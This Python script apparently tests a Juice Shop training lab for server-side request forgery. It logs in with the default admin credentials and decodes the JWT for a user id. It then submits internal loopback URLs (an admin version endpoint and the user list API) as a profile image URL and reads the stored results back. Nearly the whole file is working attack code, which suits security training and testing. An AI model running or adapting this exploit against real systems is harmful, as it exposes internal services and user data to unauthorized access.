#!/usr/bin/env python3
"""
SSRF Test Script for Juice Shop - Profile Image URL Endpoint
Tests Server-Side Request Forgery via POST /profile/image/url
Uses only Python standard library (no third-party dependencies).
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import base64
import time

BASE_URL = "http://juice-shop:3000"
TIMEOUT = 15

SEPARATOR = "=" * 70


def print_section(title):
    print(f"\n{SEPARATOR}")
    print(f"  {title}")
    print(SEPARATOR)


def print_response_details(label, status, headers, body_bytes):
    print(f"\n--- {label} ---")
    print(f"Status Code : {status}")
    print(f"Headers     :")
    for k, v in headers.items():
        print(f"              {k}: {v}")
    print(f"Body (raw)  :")
    try:
        print(body_bytes.decode("utf-8", errors="replace"))
    except Exception as e:
        print(repr(body_bytes[:500]))


def do_request(method, url, data=None, headers=None, cookies=None):
    """
    Perform an HTTP request and return (status, headers_dict, body_bytes).
    data: dict → will be form-encoded (POST), or bytes already encoded.
    cookies: dict → added as Cookie header.
    """
    req_headers = {}
    if headers:
        req_headers.update(headers)

    if cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
        req_headers["Cookie"] = cookie_str

    body = None
    if data is not None:
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode("utf-8")
            req_headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, (bytes, bytearray)):
            body = data
        else:
            body = data.encode("utf-8")

    req = urllib.request.Request(url, data=body, headers=req_headers, method=method)

    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
            status = resp.status
            resp_headers = dict(resp.headers)
            body_bytes = resp.read()
            return status, resp_headers, body_bytes
    except urllib.error.HTTPError as e:
        status = e.code
        resp_headers = dict(e.headers)
        body_bytes = e.read()
        return status, resp_headers, body_bytes
    except urllib.error.URLError as e:
        return None, {}, str(e).encode()


# ---------------------------------------------------------------------------
# STEP 1: Authenticate
# ---------------------------------------------------------------------------
print_section("STEP 1: Authenticate — POST /rest/user/login")

login_url = f"{BASE_URL}/rest/user/login"
login_payload = json.dumps({"email": "admin@juice-sh.op", "password": "admin123"}).encode("utf-8")

print(f"POST {login_url}")
print(f'Payload: {{"email":"admin@juice-sh.op","password":"admin123"}}')

status, headers, body = do_request(
    "POST",
    login_url,
    data=login_payload,
    headers={"Content-Type": "application/json"},
)

print_response_details("Login Response", status, headers, body)

if status is None:
    print("[ERROR] Login request failed (connection error)")
    raise SystemExit(1)

try:
    login_data = json.loads(body)
    auth = login_data.get("authentication", {})
    token = auth.get("token")
    if not token:
        raise ValueError("No token in response")

    # Decode JWT payload (middle segment) to extract user id
    parts = token.split(".")
    if len(parts) == 3:
        padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
        decoded = json.loads(base64.urlsafe_b64decode(padded))
        # JWT payload structure: { "status":..., "data": { "id": 1, ... }, "iat": ... }
        user_id = decoded.get("id") or decoded.get("data", {}).get("id")
        print(f"\nDecoded JWT payload: {json.dumps(decoded, indent=2)}")
    else:
        decoded = {}
        user_id = auth.get("bid")

    print(f"\n[+] JWT Token : {token[:60]}...")
    print(f"[+] User ID   : {user_id}")
except (KeyError, ValueError, json.JSONDecodeError) as e:
    print(f"[ERROR] Failed to parse login response: {e}")
    raise SystemExit(1)

cookies = {"token": token}

# ---------------------------------------------------------------------------
# STEP 2: SSRF — target http://127.0.0.1:3000/rest/admin/application-version
# ---------------------------------------------------------------------------
print_section("STEP 2: SSRF Payload → /rest/admin/application-version")

ssrf_target_1 = "http://127.0.0.1:3000/rest/admin/application-version"
ssrf_url = f"{BASE_URL}/profile/image/url"

print(f"POST {ssrf_url}")
print(f"Form body : imageUrl={ssrf_target_1}")
print(f"Cookie    : token=<jwt>")

status2, headers2, body2 = do_request(
    "POST",
    ssrf_url,
    data={"imageUrl": ssrf_target_1},
    cookies=cookies,
)

print_response_details("SSRF Request Response (Step 2)", status2, headers2, body2)

# ---------------------------------------------------------------------------
# STEP 3: Fetch resulting uploaded image (application-version result)
# ---------------------------------------------------------------------------
print_section(f"STEP 3: Fetch Resulting Image → /assets/public/images/uploads/{user_id}.jpg")

image_url = f"{BASE_URL}/assets/public/images/uploads/{user_id}.jpg"
print(f"GET {image_url}")

# Brief pause to let the server finish writing the file
time.sleep(1)

status3, headers3, body3 = do_request("GET", image_url, cookies=cookies)

print_response_details("Fetched Image Response (application-version result)", status3, headers3, body3)

print("\n[RAW CONTENT AS TEXT — complete]:")
print(body3.decode("utf-8", errors="replace"))

# ---------------------------------------------------------------------------
# STEP 4a: SSRF — target http://127.0.0.1:3000/api/Users
# ---------------------------------------------------------------------------
print_section("STEP 4a: SSRF Payload → /api/Users")

ssrf_target_2 = "http://127.0.0.1:3000/api/Users"
print(f"POST {ssrf_url}")
print(f"Form body : imageUrl={ssrf_target_2}")
print(f"Cookie    : token=<jwt>")

status4a, headers4a, body4a = do_request(
    "POST",
    ssrf_url,
    data={"imageUrl": ssrf_target_2},
    cookies=cookies,
)

print_response_details("SSRF Request Response (Step 4a)", status4a, headers4a, body4a)

# ---------------------------------------------------------------------------
# STEP 4b: Fetch resulting uploaded image (api/Users result)
# ---------------------------------------------------------------------------
print_section(f"STEP 4b: Fetch Resulting Image → /assets/public/images/uploads/{user_id}.jpg")

print(f"GET {image_url}")

time.sleep(1)

status4b, headers4b, body4b = do_request("GET", image_url, cookies=cookies)

print_response_details("Fetched Image Response (api/Users result)", status4b, headers4b, body4b)

print("\n[RAW CONTENT AS TEXT — complete]:")
print(body4b.decode("utf-8", errors="replace"))

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
print_section("SUMMARY")
print(f"Base URL        : {BASE_URL}")
print(f"User ID         : {user_id}")
print(f"SSRF Endpoint   : POST {ssrf_url}")
print(f"SSRF Target 1   : {ssrf_target_1}")
print(f"SSRF Target 2   : {ssrf_target_2}")
print(f"Image URL       : {image_url}")

print(f"\nStep 2  SSRF status  : {status2}")
print(f"Step 3  Image status : {status3}  | Content-Type: {headers3.get('Content-Type', 'n/a')}")
print(f"Step 4a SSRF status  : {status4a}")
print(f"Step 4b Image status : {status4b}  | Content-Type: {headers4b.get('Content-Type', 'n/a')}")

# Determine SSRF success heuristic
def ssrf_verdict(img_status, img_body: bytes, target):
    if img_status and 200 <= img_status < 300:
        txt = img_body.decode("utf-8", errors="replace")
        if any(kw in txt for kw in ["{", "version", "users", "data", "email", "id"]):
            return f"LIKELY VULNERABLE — image file contains JSON-like content from {target}"
    return "NOT confirmed (image missing or no internal content detected)"

print(f"\nSSRF Verdict (app-version) : {ssrf_verdict(status3, body3, ssrf_target_1)}")
print(f"SSRF Verdict (api/Users)   : {ssrf_verdict(status4b, body4b, ssrf_target_2)}")

print("\n[Done]")
